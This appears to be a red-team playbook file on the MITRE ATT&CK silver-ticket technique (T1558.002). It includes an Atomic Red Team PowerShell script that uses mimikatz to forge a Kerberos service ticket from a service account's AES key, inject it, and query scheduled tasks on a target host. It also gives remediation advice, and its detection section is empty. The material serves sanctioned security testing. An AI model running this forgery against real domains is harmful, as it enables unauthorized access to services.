---
name: "T1558.002_silver-ticket"
description: "Adversaries who have the password hash of a target service account (e.g."
category: "authentication"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1558.002
  - credential-access
  - windows
  - sub-technique
technique_id: "T1558.002"
tactic: "credential-access"
all_tactics:
  - credential-access
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1558/002"
tech_stack:
  - windows
cwe_ids:
  - CWE-522
chains_with:
  - T1558
  - T1558.001
  - T1558.003
  - T1558.004
  - T1558.005
prerequisites:
  - T1558
severity_boost:
  T1558: "Chain with T1558 for deeper attack path"
  T1558.001: "Chain with T1558.001 for deeper attack path"
  T1558.003: "Chain with T1558.003 for deeper attack path"
---

# T1558.002 Silver Ticket

> **Sub-technique of:** T1558

## High-Level Description

Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.

Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.

Password hashes for target services may be obtained using OS Credential Dumping or Kerberoasting.

## Kill Chain Phase

- Credential Access (TA0006)

**Platforms:** Windows

## What to Check

- [ ] Identify if Silver Ticket technique is applicable to target environment
- [ ] Check Windows systems for indicators of Silver Ticket
- [ ] Verify mitigations are bypassed or absent (3 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Crafting Active Directory silver tickets with mimikatz

Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.
The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.

**Supported Platforms:** windows

```powershell
Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = "#{domain_sid}"
If ($domain_sid -Match "DEFAULT") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate "runas /netonly" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to silver.txt temp file, because we cannot capture "runas /netonly" output otherwise
@"
>%TEMP%\silver.txt 2>&1 (
  echo Purge existing tickets and create silver ticket:
  klist purge
  #{mimikatz_path} "kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{service_aes256_key} /user:#{account} /service:HOST /target:#{target}.#{domain} /ptt" "exit"

  echo.
  echo executing:schtasks /query /S #{target}.#{domain}
  schtasks /query /S #{target}.#{domain}
  
  echo.
  echo Tickets after requesting schtasks:
  klist

  echo.
  echo End of Silver Ticket attack
)
"@ -Replace "DOMAIN_SID", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat

# run batch file in a new empty session (password and username do not matter)
echo "foo" | runas /netonly /user:fake "$env:TEMP\silver.bat" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path "$env:TEMP\silver.txt" -Wait | ForEach-Object {
    if ($_ -match 'End of Silver Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\silver.txt

# cleanup temp files
Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore
```

**Dependencies:**
- Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Silver Ticket by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1558.002 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1027 Password Policies
Ensure strong password length (ideally 25+ characters) and complexity for service accounts and that these passwords periodically expire. Also consider using Group Managed Service Accounts or another third party product such as password vaulting.

### M1026 Privileged Account Management
Limit service accounts to minimal required privileges, including membership in privileged groups such as Domain Administrators.

### M1041 Encrypt Sensitive Information
Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible.


## Detection

### Detect Forged Kerberos Silver Tickets (T1558.002)


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Silver Ticket technique applicable | High | Credential Access |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-522 | Insufficiently Protected Credentials |


## References

- [ADSecurity Silver Tickets](https://adsecurity.org/?p=2011)
- [ADSecurity Detecting Forged Tickets](https://adsecurity.org/?p=1515)
- [Medium Detecting Attempts to Steal Passwords from Memory](https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea)
- [Atomic Red Team - T1558.002](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1558.002)
- [MITRE ATT&CK - T1558.002](https://attack.mitre.org/techniques/T1558/002)
